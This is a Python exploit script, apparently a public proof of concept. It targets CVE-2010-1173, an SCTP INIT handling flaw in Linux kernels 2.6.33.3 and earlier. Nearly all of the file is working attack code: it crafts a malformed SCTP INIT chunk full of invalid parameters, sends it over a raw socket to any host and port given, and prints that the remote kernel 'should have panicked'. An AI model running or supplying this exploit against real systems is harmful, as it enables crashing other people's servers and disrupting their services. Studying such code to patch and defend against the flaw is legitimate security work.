# From: http://jon.oberheide.org/files/sctp-boom.py
#!/usr/bin/env python

'''
  sctp-boom.py

  Linux Kernel <= 2.6.33.3 SCTP INIT Remote DoS
  Jon Oberheide <jon@oberheide.org>
  http://jon.oberheide.org

  Information:

    http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1173

    The sctp_process_unk_param function in net/sctp/sm_make_chunk.c in the
    Linux kernel 2.6.33.3 and earlier, when SCTP is enabled, allows remote
    attackers to cause a denial of service (system crash) via an SCTPChunkInit
    packet containing multiple invalid parameters that require a large amount
    of error data.

  Usage:

    $ python sctp-boom.py 1.2.3.4 19000
    [+] sending malformed SCTP INIT msg to 1.2.3.4:19000
    ...
    [+] kernel should have panicked on remote host 1.2.3.4

  Requirements:

    * dnet: http://libdnet.sourceforge.net/
    * dpkt: http://code.google.com/p/dpkt/

'''

import os, sys, socket

def err(txt):
    print '[-] error: %s' % txt
    sys.exit(1)

def msg(txt):
    print '[+] %s' % txt

def usage():
    print >> sys.stderr, 'usage: %s host port' % sys.argv[0]
    sys.exit(1)

try:
    import dpkt
except ImportError:
    err('requires dpkt library: http://code.google.com/p/dpkt/')

try:
    import dnet
except ImportError:
    try:
        import dumbnet as dnet
    except ImportError:
        err('requires dnet library: http://libdnet.sourceforge.net/')

def main():
    if len(sys.argv) != 3:
        usage()

    host = sys.argv[1]
    port = int(sys.argv[2])

    try:
        sock = dnet.ip()
        intf = dnet.intf()
    except OSError:
        err('requires root privileges for raw socket access')

    dst_addr = socket.gethostbyname(host)
    interface = intf.get_dst(dnet.addr(dst_addr))
    src_addr = interface['addr'].ip

    msg('sending malformed SCTP INIT msg to %s:%s' % (dst_addr, port))

    invalid = ''
    invalid += '\x20\x10\x11\x73'
    invalid += '\x00\x00\xf4\x00'
    invalid += '\x00\x05'
    invalid += '\x00\x05'
    invalid += '\x20\x10\x11\x73'

    for i in xrange(20):
        invalid += '\xc0\xff\x00\x08\xff\xff\xff\xff'

    init = dpkt.sctp.Chunk()
    init.type = dpkt.sctp.INIT
    init.data = invalid
    init.len = len(init)

    sctp = dpkt.sctp.SCTP()
    sctp.sport = 0x1173
    sctp.dport = port
    sctp.data = [ init ]

    ip = dpkt.ip.IP()
    ip.src = src_addr
    ip.dst = dnet.ip_aton(dst_addr)
    ip.p = dpkt.ip.IP_PROTO_SCTP
    ip.data = sctp
    ip.len = len(ip)

    print `ip`

    pkt = dnet.ip_checksum(str(ip))
    sock.send(pkt)

    msg('kernel should have panicked on remote host %s' % (dst_addr))

if __name__ == '__main__':
    main()